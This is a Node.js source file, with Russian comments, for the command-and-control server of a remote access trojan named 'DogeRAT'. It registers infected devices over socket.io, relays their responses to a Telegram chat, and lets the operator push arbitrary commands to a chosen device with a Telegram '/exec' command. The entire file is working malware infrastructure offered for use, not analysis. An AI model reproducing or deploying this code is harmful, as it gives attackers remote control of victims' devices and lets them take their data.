const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" }
});

// Читаем конфиг
const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(config.token, { polling: true });

// Хранилище подключенных устройств
const clients = new Map();

io.on('connection', (socket) => {
    console.log('Device connected:', socket.id);
    
    socket.on('register', (data) => {
        clients.set(socket.id, { id: data.deviceId, socket: socket });
        bot.sendMessage(config.id, `✅ Новое устройство: ${data.deviceId}\nМодель: ${data.model || 'unknown'}`);
    });
    
    socket.on('response', (data) => {
        bot.sendMessage(config.id, `📥 Ответ от ${data.deviceId}:\n${data.data}`);
    });
    
    socket.on('disconnect', () => {
        console.log('Device disconnected:', socket.id);
        clients.delete(socket.id);
    });
});

// Простой ответ для проверки в браузере
app.get('/', (req, res) => {
    res.send('DogeRAT сервер работает! Подключенных устройств: ' + clients.size);
});

// Команды от Telegram бота
bot.onText(/\/devices/, (msg) => {
    let list = '📱 Подключенные устройства:\n';
    for (let [id, client] of clients) {
        list += `• ${client.id}\n`;
    }
    bot.sendMessage(msg.chat.id, list || 'Нет подключенных устройств');
});

bot.onText(/\/exec (.+) (.+)/, (msg, match) => {
    const deviceId = match[1];
    const command = match[2];
    for (let [socketId, client] of clients) {
        if (client.id === deviceId) {
            client.socket.emit('command', { type: 'exec', command: command });
            bot.sendMessage(msg.chat.id, `⏳ Команда отправлена на ${deviceId}`);
            return;
        }
    }
    bot.sendMessage(msg.chat.id, `❌ Устройство ${deviceId} не найдено`);
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
